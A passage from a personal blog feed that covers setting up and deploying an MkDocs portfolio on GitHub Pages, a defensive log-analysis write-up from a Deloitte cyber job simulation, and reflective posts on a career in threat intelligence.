<p><a href="https://github.com/FernandoCelmer" target="_blank" rel="noopener noreferrer" class="">Fernando Celmer's GitHub page</a> provides a simple guide for how to install the template which I will outline below.</p>
<p>To install MKDocs, run the following command from the command line (in the directory you want your portfolio in):</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip install mkdocs</span><br></span></code></pre></div></div>
<p>Once you have installed MKDocs, you can now install the theme using PIP:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip install mkdocs-simple-blog</span><br></span></code></pre></div></div>
<p>After the theme has been installed, edit the <code>mkdocs.yml</code> file and set the theme name to <code>simple-blog</code>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">theme:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    name: simple-blog</span><br></span></code></pre></div></div>
<p>Once completed, you can now move onto Step 3! If you had any trouble executing the above commands, read below.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="method-2-the-paige-way">Method 2: The Paige Way<a href="https://paigehai.github.io/blog/github-pages-guide#method-2-the-paige-way" class="hash-link" aria-label="Direct link to Method 2: The Paige Way" title="Direct link to Method 2: The Paige Way" translate="no">​</a></h4>
<p>It is just my luck that I ran into some errors running these commands (maybe Linux, or just my skillset?).</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/port9.png" alt="GitHub Portfolio" class="shadow--md" style="max-width:700px;width:100%;height:auto"></div>
<p>If you also have issues, I have found an alternative method which begins by installing PIPX globally.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo apt install pipx</span><br></span></code></pre></div></div>
<p>Once this is installed, proceed with the global MKDocs installation.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pipx install mkdocs</span><br></span></code></pre></div></div>
<p>Injected the selected theme into the pipx-managed MKDocs installation using:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pipx inject mkdocs mkdocs-simple-blog</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-3-maintain-the-website">Step 3: Maintain the Website<a href="https://paigehai.github.io/blog/github-pages-guide#step-3-maintain-the-website" class="hash-link" aria-label="Direct link to Step 3: Maintain the Website" title="Direct link to Step 3: Maintain the Website" translate="no">​</a></h3>
<p>Once you have successfully installed MKDocs and the site template, create a new project:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdocs portfolio</span><br></span></code></pre></div></div>
<p>This will initialise the following files:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">portfolio/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├── docs/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│   └── index.md          # Your homepage content</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└── mkdocs.yml            # Main configuration file</span><br></span></code></pre></div></div>
<p>Once all of these steps have been completed, change into the appropriate directory:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd portfolio </span><br></span></code></pre></div></div>
<p>build the site</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdocs build</span><br></span></code></pre></div></div>
<p>and serve the site locally.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mkdocs serve</span><br></span></code></pre></div></div>
<p>You are now able to view the website at <code>http://localhost:8000/</code>. This is the time where you can really challenge both your creativity and your development skills, as you can now start to build your website using the template as a base.</p>
<blockquote>
<p>I found adding an <code>extra.css</code> file, and images folders really helped me manage my backend. It also helped me refine my markdown skills, as my brain has been in Python development mode over the first half of the year.</p>
</blockquote>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-4-deploying-the-correct-site">Step 4: Deploying the Correct Site<a href="https://paigehai.github.io/blog/github-pages-guide#step-4-deploying-the-correct-site" class="hash-link" aria-label="Direct link to Step 4: Deploying the Correct Site" title="Direct link to Step 4: Deploying the Correct Site" translate="no">​</a></h3>
<p>GitHub allows you to select different branches to be used as your main site. Once you have committed your changes to GitHub, double-check that GitHub is being built from the <code>gh-pages</code> branch in the <code>/(root)</code> folder.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/port10.png" alt="GitHub Portfolio" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-4-implement-a-deployment-script---linux">Step 4: Implement a Deployment Script - Linux<a href="https://paigehai.github.io/blog/github-pages-guide#step-4-implement-a-deployment-script---linux" class="hash-link" aria-label="Direct link to Step 4: Implement a Deployment Script - Linux" title="Direct link to Step 4: Implement a Deployment Script - Linux" translate="no">​</a></h4>
<p>When I was editing my website, I found that manually inputting commands became incredibly time-consuming. In addition, sometimes pages wouldn't update and elements I added weren't being reflected. This became a task as I really needed a reliable method to deploy the website without facing issues of backdated content.</p>
<p>So, I created a simple script titled <code>deploy.sh</code> in the same directly as my portfolio, that you can implement if you created your site using MKDocs. This script allowed me to update my <code>master</code> branch and keep the content to the most recent version. It has saved me many hours of banging my head against my desk, that's for sure!</p>
<div class="language-angular2html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-angular2html codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Stage all changes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git add .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Commit with message</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git commit -m "Update docs"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Push changes to master or main depending on your main branch</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git push origin master/main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Build and deploy to GitHub Pages</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mkdocs gh-deploy --clean --force</span><br></span></code></pre></div></div>
<p>To execute the script, ensure that you have execute permissions.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">chmod +x deploy.sh</span><br></span></code></pre></div></div>
<p>To execute the script, you now simply need to execute the following commands:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">source venv/bin/activate # Activates a virtual environment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./deploy.sh # Deployment script</span><br></span></code></pre></div></div>
<p>When you run the script, GitHub will ask you to log in using your username and password. When entering your password, ensure you have set up a <strong>Classic token</strong> in GitHub, and use this, otherwise if you have MFA (like myself), you will receive an error.</p>
<blockquote>
<p>You may not need to activate a virtual environment, however, I have had issues without using venv so using the virtual environment has given me the most success.</p>
</blockquote>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="implement-a-deployment-script---windows">Implement a Deployment Script - Windows<a href="https://paigehai.github.io/blog/github-pages-guide#implement-a-deployment-script---windows" class="hash-link" aria-label="Direct link to Implement a Deployment Script - Windows" title="Direct link to Implement a Deployment Script - Windows" translate="no">​</a></h4>
<p>Update! I have migrated from both Linux to Windows and back again, so I decided to add this aside for those who want to create the deployment script on Windows. This file is denoted <code>deploy.ps1</code>.</p>
<div class="language-angular2html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-angular2html codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Stage all changes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git add .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Commit with a message</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git commit -m "Update docs"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Push to master</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git push origin master</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Build and deploy to GitHub Pages</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mkdocs gh-deploy --clean --force</span><br></span></code></pre></div></div>
<p>Running the script, you may be asked for your username and password. Add your <strong>Classic token</strong> from GitHub, and you'll be good to go.</p>
<p>Before executing the script, I like running the following commands to set up a virtual environment (similar to Linux), as I find that this is the most reliable. Run the commands:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass # Temporarily runs local scripts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.\venv\Scripts\Activate.ps1 # Activate virtual environment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./deploy.ps1 # Deployment script</span><br></span></code></pre></div></div>
<p>Once you have completed all of the above, congratulations! 🎉 You are now able to start maintaining your own portfolio website and update it as you see fit! (I will literally be using this method to upload this very blog post!).</p>]]></content:encoded>
            <category>Guide</category>
            <category>Tools</category>
        </item>
        <item>
            <title><![CDATA[Deloitte Cyber Job Simulation Write Up]]></title>
            <link>https://paigehai.github.io/blog/deloitte-write-up</link>
            <guid>https://paigehai.github.io/blog/deloitte-write-up</guid>
            <pubDate>Fri, 13 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/deloitte-thumb.png" alt="Deloitte Job Simulation Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>A job simulation exercise that involved reading web activity logs, supporting a client in a cybersecurity breach, and providing analytical, data-based conclusions to identify suspicious user activity.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-introduction">1. Introduction<a href="https://paigehai.github.io/blog/deloitte-write-up#1-introduction" class="hash-link" aria-label="Direct link to 1. Introduction" title="Direct link to 1. Introduction" translate="no">​</a></h3>
<p>A major news publication has revealed sensitive private information about Daikibo Industrials, our client. A production problem has caused its assembly lines to stop, threatening the smooth operation of supply chains relying on Daikibo’s products. The client suspects the security of their new status board may have been breached.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="11-scope">1.1 Scope<a href="https://paigehai.github.io/blog/deloitte-write-up#11-scope" class="hash-link" aria-label="Direct link to 1.1 Scope" title="Direct link to 1.1 Scope" translate="no">​</a></h4>
<p>This investigation will aim to answer the following questions:<br>
<!-- -->• Is there a way for a hacker to access Daikibo's manufacturing status dashboard directly from the internet?<br>
<!-- -->• Are there any suspicious requests or long sequences of user requests?<br>
<!-- -->• What are the indicators of automated requests?<br>
<!-- -->• What is the ID of the user that is making the suspicious requests?</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-is-there-a-way-for-a-hacker-to-access-daikibos-manufacturing-status-dashboard-directly-from-the-internet">2. Is there a way for a hacker to access Daikibo's manufacturing status dashboard directly from the internet?<a href="https://paigehai.github.io/blog/deloitte-write-up#2-is-there-a-way-for-a-hacker-to-access-daikibos-manufacturing-status-dashboard-directly-from-the-internet" class="hash-link" aria-label="Direct link to 2. Is there a way for a hacker to access Daikibo's manufacturing status dashboard directly from the internet?" title="Direct link to 2. Is there a way for a hacker to access Daikibo's manufacturing status dashboard directly from the internet?" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="tools-used">Tools Used<a href="https://paigehai.github.io/blog/deloitte-write-up#tools-used" class="hash-link" aria-label="Direct link to Tools Used" title="Direct link to Tools Used" translate="no">​</a></h4>
<p>• <strong>web_activity.log</strong>: a log file containing data pertaining to the alleged breach.<br>
<!-- -->• <strong>Visual Studio Code</strong>: an IDE to assist in analysing the log file</p>
<p>To answer this question, it was important to begin analysing the activity within the logs to gather some information with regards to how the Daikibo Industrials dashboard has been implemented.</p>
<p>Utilising IP address 192.168.0.50 as an initial reference point, it is clear that each user must log into the dashboard with authorised credentials, which then allows them access to the dashboard. I can observe the primary <strong>GET</strong> request, with the status assigned as <strong>401 (UNAUTHORIZED)</strong>, however, once the correct credentials have been provided, the user successfully logs in. This is denoted by the new <strong>200 (SUCCESS)</strong> status.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte1.png" alt="Log Analysis" class="shadow--md" style="max-width:1000px;width:100%;height:auto"></div>
<p>Once the user has logged in using their credentials, I notice that they are assigned an authorised user ID. For IP <strong>192.168.0.50</strong>, this user ID is <code>5Eckr4DTaLLDaDMGqmMJ3g</code>.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte2.png" alt="Log Analysis" class="shadow--md" style="max-width:1000px;width:100%;height:auto"></div>
<p>This user, now authorised, can access the dashboard and make API requests to the status of their manufacturing plants.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte3.png" alt="Log Analysis" class="shadow--md" style="max-width:1000px;width:100%;height:auto"></div>
<p>Exploring the networking elements further, I notice that all IP addresses begin with the same internal subnet structure: <strong>192.168.0.x</strong>. This structure is important to note, as these IP addresses would only be assigned to devices that are directly connected to the internal network (the call is coming from inside the house! ☎️). This heavily suggests that in order to gain access to the dashboard, the threat actor must already be within the internal network. Due to this, it is not possible for the threat actor to have accessed the dashboard directly from the Internet.</p>
<p>I can now conclude that the process to gain access to Daikibo's manufacturing status database requires:<br>
<!-- -->• valid log-in credentials, and<br>
<!-- -->• an internal IP address in the subnet <strong>192.168.0.x</strong></p>
<p>These findings help support my hypothesis that the threat actor did not access Daikibo's dashboard from the Internet, but rather from the internal network (perhaps a disgruntled insider, or phishing? 👀). As such, this answers the first question in the investigation.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-are-there-any-suspicious-requests-or-long-sequences-of-user-requests">3. Are there any suspicious requests or long sequences of user requests?<a href="https://paigehai.github.io/blog/deloitte-write-up#3-are-there-any-suspicious-requests-or-long-sequences-of-user-requests" class="hash-link" aria-label="Direct link to 3. Are there any suspicious requests or long sequences of user requests?" title="Direct link to 3. Are there any suspicious requests or long sequences of user requests?" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="tools-used-1">Tools Used<a href="https://paigehai.github.io/blog/deloitte-write-up#tools-used-1" class="hash-link" aria-label="Direct link to Tools Used" title="Direct link to Tools Used" translate="no">​</a></h4>
<p>• <strong>web_activity.log</strong><br>
<!-- -->• <strong>Visual Studio Code</strong></p>
<p>When scrolling through the log file using Visual Studio Code, I noticed in the right-hand side overview panel, there is a section with many requests that seems unusual for the typical pattern of behaviour from Daikibo employees.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte4.png" alt="Log Analysis" class="shadow--md" style="max-width:100px;width:100%;height:auto"></div>
<p>When examining the pattern of behaviour from a regular employee, it is evident that each user typically logs in using their credentials, subsequently being assigned an authorised ID. They then access the dashboard and execute multiple API calls to obtain the status of specific machines or plants. In the below example, we can see that IP address <strong>192.168.0.38</strong> logs in, and obtains the user ID <strong>irHRppZK35peUiTjxPuCdL</strong>. This user then requests the status of the Seiko plant, and the Laser Welder machine at the Seiko plant. This is the last request from this user.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte5.png" alt="Log Analysis" class="shadow--md" style="max-width:1000px;width:100%;height:auto"></div>
<p>Analysing another, longer log, a similar patterns is observed.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte6.png" alt="Log Analysis" class="shadow--md" style="max-width:1000px;width:100%;height:auto"></div>
<p>In this example, <strong>192.168.0.25</strong> logs in with their credentials, obtaining the user ID <strong>bqZd59gNjgDxywqXFEtjT6</strong>. This user makes multiple API requests to the dashboard, requesting the status of the Seiko plant and machines at this plant. This user returns at 9:03:55AM on the 27th, and is required to log-in again, as their credentials have now expired. Once this is validated, the user then proceeds to make more API requests on more machines at the Meiyo plant.</p>
<p>This makes the long requests in the overview panel seem quite suspicious. Inspecting these logs further, I can see that there are a total of <strong>69</strong> unauthorised API requests made from IP address <strong>192.168.0.101</strong>.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte7.png" alt="Log Analysis" class="shadow--md" style="max-width:1000px;width:100%;height:auto"></div>
<p>This confirms the presence of suspicious user requests, and despite the users log-in credentials expiring at exactly 12:00AM on <strong>June 26th, 2021</strong>, the user was still able to make API requests.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-what-are-the-indicators-of-automated-requests">4. What are the indicators of automated requests?<a href="https://paigehai.github.io/blog/deloitte-write-up#4-what-are-the-indicators-of-automated-requests" class="hash-link" aria-label="Direct link to 4. What are the indicators of automated requests?" title="Direct link to 4. What are the indicators of automated requests?" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="tools-used-2">Tools Used<a href="https://paigehai.github.io/blog/deloitte-write-up#tools-used-2" class="hash-link" aria-label="Direct link to Tools Used" title="Direct link to Tools Used" translate="no">​</a></h4>
<p>• <strong>web_activity.log</strong><br>
<!-- -->• <strong>Visual Studio Code</strong></p>
<p>When analysing logs for automated requests, I often find the timestamps of the logs to be the most telling. Using this approach, it is clear that for each of the four plants owned by Daikibo, an API request was made for the status of each, every hour, on the hour from the IP address <strong>192.168.0.101</strong>.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte8.png" alt="Log Analysis" class="shadow--md" style="max-width:600px;width:100%;height:auto"></div>
<p>At exactly <strong>0x:00:48</strong>, an API request is made at all four Daikibo plants which continues until the threat actor logs in again at <strong>4:04PM</strong> on <strong>June 26th, 2021</strong>.</p>
<p>This behaviour implies clear automation, as it is highly unlikely that a person would be making these requests, every hour at each plant to the millisecond. This implies that the threat actor was able to gain access to legitimate credentials, perhaps through phishing or a disgruntled employee, and set up an automated script to scrape status information from Daikibo's plants.</p>
<p>At <strong>4:04PM</strong>, the threat actor notices that they are making unauthorised requests, and logs in again which succeeds.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte9.png" alt="Log Analysis" class="shadow--md" style="max-width:1000px;width:100%;height:auto"></div>
<p>Once logged in again, the script proceeds to make successful API requests every hour, until <strong>9:00PM</strong> on <strong>June 26th, 2021</strong>, where the logs end.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte10.png" alt="Log Analysis" class="shadow--md" style="max-width:1000px;width:100%;height:auto"></div>
<p>By analysing the timestamps of each of the requests from <strong>June 25th</strong> to the <strong>26th</strong>, I was able to observe repeat, uniform requests made from the same IP address. This, in conjunction with the requests changing to unauthorised when the log-in credentials expired, imply that the threat actor was running a script in the background. It wasn't until <strong>4:04PM</strong> on the <strong>26th</strong> that the threat actor realised their requests were not successful, thus prompting them to login a second time where the script then makes more API requests until the logs end.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-what-is-the-id-of-the-user-that-is-making-the-suspicious-requests">5. What is the ID of the user that is making the suspicious requests?<a href="https://paigehai.github.io/blog/deloitte-write-up#5-what-is-the-id-of-the-user-that-is-making-the-suspicious-requests" class="hash-link" aria-label="Direct link to 5. What is the ID of the user that is making the suspicious requests?" title="Direct link to 5. What is the ID of the user that is making the suspicious requests?" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="tools-used-3">Tools Used<a href="https://paigehai.github.io/blog/deloitte-write-up#tools-used-3" class="hash-link" aria-label="Direct link to Tools Used" title="Direct link to Tools Used" translate="no">​</a></h4>
<p>• <strong>web_activity.log</strong><br>
<!-- -->• <strong>Visual Studio Code</strong></p>
<p>Due to the formatting of the loggs provided by the client, I can view each user ID assigned to each IP address. In this case, the ID assigned to <strong>192.168.0.101</strong> is <strong>mdB7yD2dp1BFZPontHBQ1Z</strong>.</p>
<div class="text--center margin-vert--lg"><img src="https://paigehai.github.io/blog/deloitte11.png" alt="Log Analysis" class="shadow--md" style="max-width:1000px;width:100%;height:auto"></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="6-conclusion">6. Conclusion<a href="https://paigehai.github.io/blog/deloitte-write-up#6-conclusion" class="hash-link" aria-label="Direct link to 6. Conclusion" title="Direct link to 6. Conclusion" translate="no">​</a></h3>
<p>Based on my findings, the internal IP address used to first login implies that the threat actor had access to the internal network. Using legitimate login credentials during initial login indicates that the threat actor had successfully gained access to Daikibo's internal network. This threat actor was then able to deploy an automated script, scraping data from Daikibo's plants, executing API requests every hour between <strong>12:00AM</strong> and <strong>4:00PM</strong> on the <strong>26th</strong>. After detecting that their requests were no longer authorised, the threat actor reauthenticates, reducing suspicion, and resumes scraping data from <strong>5:00PM</strong> to <strong>9:00PM</strong> that same day. A focused investigation into both the IP address <strong>192.168.0.101</strong> and the user ID <strong>mdB7yD2dp1BFZPontHBQ1Z</strong> may provide further insights into how access was initially obtained. This investigation could include device-level analysis through MAC address mapping, and an internal review of phishing or credential harvesting attempts.</p>]]></content:encoded>
            <category>Job Simulation</category>
            <category>Write Up</category>
        </item>
        <item>
            <title><![CDATA[Why I’m Pursuing Threat Intelligence]]></title>
            <link>https://paigehai.github.io/blog/why-im-pursuing-threat-intelligence</link>
            <guid>https://paigehai.github.io/blog/why-im-pursuing-threat-intelligence</guid>
            <pubDate>Thu, 12 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/threatintel-thumb.png" alt="Threat Intelligence Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>Blending strong writing, analytical thinking, and an eye for detail to produce clear, actionable intelligence.</p>
<p>Throughout my life, both early and late (I'm only 24), writing has been my constant. During high school, I heavily immersed myself in English and Literature, where I found my deep appreciation for language, structure, and the art of conveying complex ideas with clarity. Reflecting on my academic success during this period further affirmed my natural inclination toward written communication and analysis.</p>
<p>After my secondary education came to an end, my professional path led me into the construction and sustainability industry. During this time, I found that my interest always returned to writing and design, where I undertook summer classes with Deakin University in Literature. Although brief, the influence this experience had still remains with me where I refined my abilities to research, synthesise information, and engage with complex, technical material.</p>
<p>One of my biggest achievements in my professional journey was securing a role as a copywriter and social media manager for a major technology company, despite not holding any formal qualifications in either field. My work stood on its own, and through the interview process, I had successfully highlighted my ability to communicate through both technical and non-technical lenses with precision. This role introduced me to the discipline of adjusting language for diverse audiences and producing work that balanced clarity with technical depth. I was regularly entrusted with projects that extended beyond my initial scope of responsibilities, providing opportunities to develop new skills and broaden my undestanding of technology which I found was an incredibly rewarding experience. Without this, my approach to report writing would not be what it is today.</p>
<p>It was within this role that my curiosity for technology strengthened, where while assisting with a warehouse relocation, I found myself drawn to the hardware and infrastructure around me. What initially began as exposure to product knowledge soon became a fascination with the intricate systems that provide the foundation for computing and information technology. This deepened further as I started my tertiary education in cybersecurity, where first-year units such as Computer Systems introduced me to the technical frameworks and challenges that define these very physical components I learnt about in my professional role.</p>
<p>Throughout these varying experiences, one single thread remained constant: my attention-to-detail. Whether it's crafting reports, analysing information, or communicating findings in an engaging manner, I have always focused on the finer points that others may overlook. It is often these subtle elements that carry the greatest weight in both writing and technical analysis. It is the fine balance between clarity, and accuracy. Threat intelligence, by its very nature, demands such accuracy by dissecting vast amounts of information, identifying meaningful patterns, and presenting these findings in a way that informs decisions and mitigates risk.</p>
<p>My work in cybersecurity has allowed me to merge these complementary skills, as demonstrated by the most amazing feedback given in my Computer Forensics and Investigations unit:
This was further demonstrated in my SIT282 class, where I received the most amazing feedback:</p>
<p align="center"><img src="https://paigehai.github.io/blog/feedback.png" alt="Feedback" width="300"></p>
<p>(This is why I do what I do!!! 🥹)</p>
<p>Threat intelligence presents a space where I can apply my love of language, my analytical mindset, and my growing technical expertise. It allows me to directly engage in complex problems, and present my findings to a diverse audience with purpose.</p>
<p>Above all, my path has been guided by curiosity. Many of the opportunities that have defined my interests arose from moments where I chose to step outside my comfort zone. Had I not volunteered to assist with a warehouse move, I might have never encountered the world of technology in the way that I have and for this I am forever grateful to this single decision. That same openness is what drives me forward to this day as I continue to build a life for myself within cybersecurity, embracing all the wacky and wonderful challenges that come my way.</p>
<p>My journey did not follow a conventional route, yet reflects a constant pursuit for excellence, adaptability, and a genuine passion for both writing and analysis. I am eager to continue demonstrating these qualities within my future work.</p>]]></content:encoded>
            <category>Reflections</category>
            <category>Threat Intelligence</category>
        </item>
        <item>
            <title><![CDATA[Unteachable and the Art of Becoming]]></title>
            <link>https://paigehai.github.io/blog/unteachable</link>
            <guid>https://paigehai.github.io/blog/unteachable</guid>
            <pubDate>Fri, 01 Nov 2024 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/unteachable-thumb.png" alt="Unteachable Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>A personal reflection on what it means to learn, grow, and challenge fixed ideas of teachability.</p>
